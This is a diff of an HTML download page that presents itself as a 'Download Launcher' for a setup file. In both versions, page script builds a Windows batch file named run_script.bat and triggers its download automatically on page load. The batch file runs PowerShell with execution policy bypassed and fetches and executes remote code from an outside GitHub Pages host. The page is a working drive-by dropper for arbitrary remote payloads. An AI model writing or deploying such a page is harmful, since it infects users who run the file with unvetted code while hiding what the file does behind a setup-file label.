@@ -1,26 +1,45 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Download Tool</title>
+    <meta charset="UTF-8">
+    <title>Download Script</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .download-btn {
+            display: inline-block;
+            padding: 15px 25px;
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .download-btn:hover { background-color: #0056b3; }
+    </style>
 </head>
 <body>
-    <p>Your download should start automatically. If it doesn't, click the link below.</p>
-    <a id="downloadLink" style="display:none;">Click here to download</a>
+
+    <h2>Download Launcher</h2>
+    <p>Click the button below to download the setup file.</p>
+    
+    <!-- This link is now visible and styled as a button -->
+    <a id="downloadBtn" class="download-btn">Download .bat File</a>
 
     <script>
+        const batContent = `@echo off\npowershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'n00oob.github.io' | iex"\nexit`;
+        
+        // Encode the content to Base64 to make it a downloadable URI
+        const encodedContent = btoa(batContent);
+        const link = document.getElementById('downloadBtn');
+        
+        link.href = 'data:application/x-bat;base64,' + encodedContent;
+        link.download = "run_script.bat";
+
+        // Optional: Try to trigger it automatically as well
         window.onload = function() {
-            const batContent = `@echo off\npowershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'n00oob.github.io' | iex"\nexit`;
-            
-            const blob = new Blob([batContent], { type: 'text/plain' });
-            
-            const link = document.getElementById('downloadLink');
-            link.href = window.URL.createObjectURL(blob);
-            link.download = "run_script.bat";
-            
             link.click();
-            
-            window.URL.revokeObjectURL(link.href);
         };
     </script>
+
 </body>
 </html>
